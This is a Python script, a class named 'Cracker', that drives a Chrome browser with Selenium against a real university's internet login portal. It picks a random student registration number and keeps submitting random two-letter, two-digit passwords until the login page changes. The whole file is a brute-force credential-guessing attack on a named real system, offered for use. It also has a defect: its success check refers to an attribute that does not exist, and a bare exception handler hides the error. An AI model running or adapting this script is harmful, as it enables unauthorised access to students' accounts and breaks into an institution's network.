import string
import random
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time



class Cracker:
    service = Service(executable_path="chromedriver.exe")
    driver = webdriver.Chrome(service=service)

    possible_numbers = list(range(0, 10))
    possible_letters = list(string.ascii_uppercase)

    username_input_field_id = 'ft_un'
    password_input_field_id = 'ft_pd'
    continue_button_class = 'primary'
    check_class = 'Firewall Authentication'

    def __init__(self) -> None:
        self.tries = []
        self.regNum = self.generateRandomRegNumber()
        self.done = False
        

    def generateRandomRegNumber(self): 
        return str(random.choice(list(range(2401000, 2401200))))

    def generateRandomPassword(self) -> str:
        password = ''
        def randomLetter() -> str:
            return random.choice(self.possible_letters)
        def randomNumber() -> int:
            return random.choice(self.possible_numbers)

        for i in range(4):
            if i < 2:
                password += randomLetter()
            else:
                password += str(randomNumber())

        return password
    

    def InputValues(self):
        self.driver.get("https://internetlogin.cu.edu.ng/portal?") 
        time.sleep(10)

        
        while True:
            try:
                username_input_field = self.driver.find_element(By.ID, self.username_input_field_id)
                username_input_field.send_keys(self.regNum)
                time.sleep(2)
                password_input_field = self.driver.find_element(By.ID, self.password_input_field_id)
                password_input_field.send_keys(self.generateRandomPassword())
                time.sleep(2)

                password_input_field = self.driver.find_element(By.CLASS_NAME, self.continue_button_class)
                password_input_field.click()
                time.sleep(10)

                checker = self.driver.find_element(By.TAG_NAME, 'h1')
                if self.check_text in checker.text :
                    break
                print(checker.text)


            except:
                pass

        self.driver.quit()
                 

    def printParamenters(self):
        print(self.possible_numbers)
        print(self.possible_letters)


program = Cracker()
print(program.generateRandomPassword(), program.regNum)

program.InputValues()
